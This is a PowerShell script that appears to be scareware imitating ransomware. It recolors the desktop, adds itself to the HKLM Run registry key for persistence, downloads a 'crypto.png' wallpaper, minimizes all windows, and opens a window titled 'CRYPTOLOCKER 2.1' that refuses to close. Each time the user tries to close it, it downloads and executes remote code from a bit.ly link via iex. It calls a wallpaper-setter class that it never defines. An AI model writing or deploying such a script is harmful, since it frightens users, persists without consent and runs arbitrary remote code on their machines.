start-sleep 50


$code = @'
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;


namespace Background 
{
    public class Setter {
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError =true)]
        private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
        public const int UpdateIniFile = 0x01;
        public const int SendWinIniChange = 0x02;
        public const int SetDesktopBackground = 0x0014;
        public const int COLOR_DESKTOP = 1;
        public int[] first = {COLOR_DESKTOP};


        public static void RemoveWallPaper() {
        SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        key.SetValue(@"WallPaper", 0);
        key.Close();
        }

        public static void SetBackground(byte r, byte g, byte b) {
            RemoveWallPaper();
            System.Drawing.Color color= System.Drawing.Color.FromArgb(r,g,b);
            int[] elements = {COLOR_DESKTOP};
            int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) }; 
            SetSysColors(elements.Length, elements, colors);
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
            key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
            key.Close();

        }

    }


}

'@
Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll -PassThru
Function Set-OSCDesktopColor
{
    <# Powershell function to remove desktop background and set background to colors we want #>
    Process
    {
        [Background.Setter]::SetBackground(0,118,163)
        return
    }
}

Set-OSCDesktopColor



#path for current script
Set-Variable ScriptPath -Value $MyInvocation.MyCommand.Path -Option Constant
#invocation path and invoke command
$storage = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$invoke  = "powershell /nologo /file $($ScriptPath)"


###
######Step 1: Change BG color
###
#set new key up
if (((Get-ItemProperty $storage).PSObject.Properties | Where-Object {
    $_.Name -notlike 'PS*'
} | Select-Object Name) -notcontains 'DesktopBackground') {
  Set-ItemProperty DesktopBackground -Path $storage -Value $invoke
}
#change desktop background
Add-Type -AssemblyName System.Drawing

$dynasm = Add-Type -MemberDefinition @'
  [DllImport("user32.dll")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern Boolean SetSysColors(
      Int32    cElements,
      Int32[]  lpaElements,
      UInt32[] lpaRgbValues
  );
'@ -Name Background -NameSpace Desktop -PassThru

[Int32[]]$elements = 1 #COLOR_DESKTOP
[Int32[]]$values = [Drawing.ColorTranslator]::ToWin32(
#  [Drawing.Color]::Black #Required color
#  Red seems more convincing so I changed it from black to red
  [Drawing.Color]::Red #Required color
)

$dynasm::SetSysColors($elements.Length, $elements, $values)




Invoke-webrequest "https://i.postimg.cc/qrSq2bbQ/crypto.png?dl=1" -Outfile "crypto.png"
[Wallpaper.Setter]::SetWallpaper( '.\crypto.png', 1 )




###
###### Step 3: Minimize windows
###
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()

###
###### Step 4: Lock workstation
###

#$shell = New-Object -com "Wscript.Shell"
#$shell.Run("%windir%\System32\rundll32.exe user32.dll,LockWorkStation")

###
###### Step 5: Pop up window display
# Loosely based on http://www.vistax64.com/powershell/202216-display-image-powershell.html

# MUSIC NOTES



[void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")

$file = (get-item '.\crypto.png')

$img = [System.Drawing.Image]::Fromfile($file);

# This tip from http://stackoverflow.com/questions/3358372/windows-forms-look-different-in-powershell-and-powershell-ise-why/3359274#3359274
[System.Windows.Forms.Application]::EnableVisualStyles();
$form = new-object Windows.Forms.Form
$form.Text = "CRYPTOLOCKER 2.1"
$form.Width = $img.Size.Width;
$form.Height =  $img.Size.Height;
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width =  $img.Size.Width;
$pictureBox.Height =  $img.Size.Height;
$form.Add_MouseHover({
[console]::beep(500,300)
[console]::beep(800,300)
[console]::beep(900,300)
})

$pictureBox.Image = $img;
$form.controls.add($pictureBox)
$form.Add_Shown( { $form.Activate() } )
$form.Add_Closing({param($sender,$e) 
[console]::beep(233.08,100) # Bb
[console]::beep(261.63,200) # C4
[console]::beep(277.18,100) # C#
[console]::beep(233.08,100) # Bb
[console]::beep(349.23,400) # F
[console]::beep(349.23,400) # F
[console]::beep(311.13,600) # D#
[console]::beep(493.88,200)
[console]::beep(523.25,200)
$e.Cancel = $true 


iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
})
$form.ShowDialog()
#$form.Show();



